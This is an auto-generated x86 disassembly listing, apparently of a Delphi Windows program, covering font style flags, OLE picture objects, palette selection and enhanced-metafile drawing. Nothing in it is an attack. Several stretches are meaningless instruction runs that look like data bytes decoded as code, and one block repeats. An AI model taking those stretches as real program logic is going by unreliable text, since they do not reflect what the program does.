mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4787f0
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478ea8
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
into
mov [ 0xffffffffd88bfff8 ] al
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4058b8
sub edx 0xffffffdc
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_47836c
and [ ebx - 0x7cd4ffb9 ] eax
inc edi
add [ 0x11004783 ] dh
add [ edi ] 0x19
add [ edi ] 0x4b
add [ edi ] 0x55
add [ edi ] 0x5f
add [ edi ] 0x3f
add [ edi ] 0x2
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
sub eax [ ebx - 0x7ccaffb9 ]
inc edi
add [ ecx ] dl
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x836cda82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x8380da82
inc edi
add ah dh
xchg ebx eax
inc edi
add [ esp + edx * 4 ] dl
inc edi
add [ eax + 0x6f ] dh
jb r-xdata
jpo r-xdata
jo r-xdata
inc edx
add [ eax - 0x6c ] bl
inc edi
add [ eax - 0x27ffb86c ] ah
outsd
inc edx
add al al
xchg esp eax
inc edi
add al ch
outsd
inc edx
add [ eax + 0x800426c ] dh
xchg ebp eax
inc edi
add [ edi + ebp * 2 + 0x42 ] bh
add [ edx * 4 - 0x6aa3ffb9 ] cl
inc edi
add al ah
xchg ebp eax
inc edi
add [ esi + edx * 4 ] ch
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x5d ] al
inc ecx
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
outsd
test [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
clc
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_478934
imul esp [ ebx - 0x75 ] 0x478504c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + eax * 2 + 0x47839000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
test [ edi ] al
sub [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ edi ] 0x34
xor al 0x40
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x47ffbfcf ] ah
xchg [ edi ] eax
in al 0x87
inc edi
add ah ah
mov es [ edi ]
andps xmm2 [ eax + 0x69 ]
arpl [ ebp + esi * 2 + 0x72 ] si
inc ecx
popad
jo r-xdata
inc edi
add [ eax * 4 + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edi ] al
sub al 0x0
add [ eax ] al
pop esp
xor eax [ edx ]
xor al 0x34
inc eax
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add [ eax + 0x6d ] bl
inc edx
add [ eax + 0xc004791 ] bh
xchg esi eax
inc ecx
add ah ch
xchg ecx eax
inc edi
add al dh
xchg ecx eax
inc edi
add [ ebp + ebp * 2 - 0x6d03ffbe ] ah
inc edi
add [ eax - 0x6d ] dh
inc edi
add al bl
xchg ebx eax
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_4058b8
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x7c ] 0x20004784
xor al 0x42
add [ eax ] al
add [ edi ] al
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478ea8
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
into
mov [ 0xffffffffd88bfff8 ] al
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4058b8
sub edx 0xffffffdc
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_478528
push ebx
call sub_4027fc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_478554
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478934
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_4058b8
sub edx 0xffffffdc
sub_4785a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478ea8
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4058b8
sub edx 0xffffffdc
sub_4785f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478637
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_478554
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47863e
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_478644
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405914
xor eax eax
push ebp
push sub_47869e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_478554
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4786a5
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_4786ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4786ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4785a4
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4786f6
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_4786fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405914
xor eax eax
push ebp
push sub_478756
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4785a4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47875d
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_478764
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4788a4
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403550
lea eax [ esi + 0x14 ]
call sub_4058b8
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4787b8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_478874
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4787f0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405914
xor eax eax
push ebp
push sub_478858
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_478874
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4058b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47885f
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_477400
sub_4788a4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_478934
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_478764
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_478970
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478b14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478b1b
lea eax [ ebp - 0x28 ]
call sub_403f7c
lea eax [ ebp - 0x24 ]
call sub_4058a0
lea eax [ ebp - 0xc ]
call sub_40465c
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4058e4
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40465c
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_478ae7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_404204
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_4249d0
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_4029f0
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_424a48
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_424a74
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_424ad8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
or bl 0x8
sub_478b38
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478cb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_40465c
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_478c89
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4058e4
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4249b8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4047a8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_424a2c
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_424a68
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_424a68
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_424a68
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_424a68
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_424ad0
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_478cc1
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478e09
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_4058e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e10
lea eax [ ebp - 0x2c ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4249b8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047a8
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_4047b8
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_424a2c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_424ad0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_479768
call sub_4771f4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4787f0
sub_478e3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478e8b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_4058e4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4787f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e92
sub_478ea8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_478764
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_478ee4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_426cb0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_4278bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478f59
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_478f5d
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_479015
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42b664
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42b698
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_42788c
call sub_42b8e8
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_4278a4
call sub_428408
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42817c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_479125
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_427dd8
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_427df0
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427e48
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4790f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_42526c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479100
mov eax [ ebp - 0x18 ]
call sub_4031ec
retn
mov eax [ ebp - 0x8 ]
call sub_4058a0
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_479784
call sub_4771f4
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4787f0
sub_479100
mov eax [ ebp - 0x10 ]
call sub_428f98
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
sub_479183
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
push ebx
mov ebx eax
mov eax ebx
call sub_4787f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_4791b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_4058b8
pop esi
pop ebx
retn
sub_4791f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42538c
xor eax eax
push ebp
push sub_4792ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_425738
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_4793a0
neg eax
push eax
mov eax ebx
call sub_4793bc
push eax
mov eax ebx
call sub_4793a0
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_4771f4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425630
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_4792fc
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_479328
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
